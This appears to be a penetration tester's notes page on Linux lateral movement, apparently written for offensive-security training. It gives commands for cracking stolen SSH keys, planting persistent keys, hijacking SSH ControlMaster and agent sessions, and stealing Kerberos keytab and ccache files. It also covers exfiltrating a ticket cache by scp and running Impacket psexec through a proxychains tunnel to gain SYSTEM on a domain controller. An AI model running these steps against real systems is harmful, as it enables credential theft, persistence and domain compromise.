---
title: Linux lateral movement
tags:
  - breach
  - operations
  - linux
  - lateral
  - movement
  - ssh
  - keys
  - kerberos
  - impacket
  - proxy
  - proxychains
  - psexec
  - domain
  - credentials
---

## Helpful SSH tips

### Attacking private keys

Look for private key files in their default location for different users, e.g.
`/home/${USERNAME}/.ssh/*`. We can get information about hosts recently
connected to via SSH by reading through `/home/${USERNAME}/.ssh/known_hosts`.

We can exfiltrate SSH private keys and attempt to crack them with
**JohnTheRipper**. To prepare a SSH private key for cracking, invoke the
following:

```bash
python /usr/share/john/ssh2john.py ${SSH_PRIV_KEY} > ${OUTFILE}.hash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt ${OUTFILE}.hash
```

### Persistence

Invoke the following to generate a new key pair on your attacker host:

```bash
ssh-keygen
```

Copy the contents of the public key, `.pub`, to you clipboard and write it to
the victim's `authorized_keys` file, persisting your ability to reestablish
future connections without credentials. Here's an example:

```bash
echo "${PUB_KEY_CONTENTS}" >> /home/${USERNAME}/.ssh/authorized_keys
```

### Hijacking with ControlMaster

**ControlMaster** is a feature in SSH that enables multiple session over a
single network connection. We can place the following contents in the
`/home/${USERNAME}/.ssh.config` to enable this feature:

```txt
Host *
        ControlPath ~/.ssh/controlmaster/%r@%h:%p
        ControlMaster auto
        ControlPersist 10m
```

Invoke the following to enable this feature:

```bash
chmod 644 ~/.ssh/config
mkdir ~/.ssh/controlmaster
```

When the user we've created this ControlMaster configuration for establishes an
SSH connection to other remote hosts, it will create a socket file in
`~/.ssh/controlmaster`. Once they establish a connection, we can also SSH to the
same target, piggybacking off their connection.

If we're not logged in as the same user as the victim user, or as the `root`
user, we can piggyback of their SSH session by invoking the following:

```bash
ssh -S ${PATH_TO_CONTROLMASTER_SOCKET} ${USER}@${RHOST}
```

### Hijacking SSH-Agent and SSH Agent Forwarding

**SSH-Agent** is a utility users can use locally to keep track of their
passphrases for private keys. **SSH Agent Forwarding** is a utility we can use
to connect to remote hosts using an intermediate host, where the intermediate
host doesn't have to store our private key.

The problem is that, if a `root` user has compromised the intermediate host,
they can hijack a session established with SSH Agent Forwarding. Invoke the
following on an intermediate host to find hijacking opportunities:

```bash
ps aux | grep ssh
pstree -p offsec | grep ssh
```

Given the process ID for an interactive session established through SSH, we can
inspect the process' environment variables to find its `SSH_AUTH_SOCK`. Invoke
the following to read a process' environment variables:

```bash
cat /proc/${PROCESS_ID}/environ
```

With a valid `SSH_AUTH_SOCK`, we can add the key for the SSH Agent to our cache.
Then we can hijack the victim's session, for example:

```bash
SSH_AUTH_SOCK=${VICTIM_SSH_AUTH_SOCK_PATH} ssh-add -l
SSH_AUTH_SOCK=${VICTIM_SSH_AUTH_SOCK_PATH} ssh ${USER}@${RHOST}
```

## Helpful Kerberos tips

### Keytab files

**Keytab** files enable users to access **Kerberos**-enabled network resources
while impersonating the user who created the keytab file. These files usually
contain a **User Principal Name (UPN)** for the domain and encrypted keys.

If you're the `root` user on a Linux machine, or you can read / access a user's
keytab files, you can load this keytab file into your cache and authenticate as
the user within the domain and access Kerberos-enabled resources the user can
access. Here's an example invocation of loading and refreshing a token for a
keytab file:

```bash
kinit ${UPN} -k -t ${KEYTAB_FILEPATH}
kinit -R
```

### Credential cache files

**Kerberos credential cache** files are written to the `/tmp` directory. As the
`root` user, if they're accessible, we can acquire them and reuse the victim
user's Ticket Granting Ticket (TGT) to access Kerberos-enabled network services.
Here's an example attack:

```bash
ls -al /tmp/krb5cc_*
sudo cp ${TARGET_CCACHE_FILE} ${OUTFILE}
sudo chown ${GROUP}:${USER} ${OUTFILE}
kdestroy
klist
export KRB5CCNAME=${OUTFILE}
klist
```

### Impacket

Using [Impacket](https://github.com/fortra/impacket), we can use a domain-joined
compromised Linux host to enumerate and attack the domain from our attacker Kali
machine. First we'll exfil our stolen **ccache** file:

```
scp ${USER}@${RHOST}:${OUTFILE} ${LOCALFILE}
export KRB5CCNAME=${LOCALFILE}
sudo apt install krb5-user --yes
```

Make sure to modify your `/etc/hosts` file to enable domain name resolution for
the Domain Controller's (DC) hostname. Also comment out the `proxy_dns`
configuration for `/etc/proxychains.conf`.

Establish a dynamic tunnel through the domain-joined, compromised host, for
example:

```bash
ssh ${OFFSEC}@${RHOST} -D 9050 -N
```

After all this setup, we can now enumerate users within the domain with the
following:

```bash
proxychains python /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip ${DCHOST} ${DOMAIN}/${USER}
```

We can also acquire all the **Service Principal Names (SPN)** for services in
the domain:

```bash
proxychains python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -k -no-pass -dc-ip ${DCHOST} ${DOMAIN}/${USER}
```

Here's an example of using `psexec` through our tunnel to obtain code execution
as **SYSTEM** on the DC:

```bash
proxychains python /usr/share/doc/python3-impacket/examples/psexec.py -k -no-pass ${UPN}
```
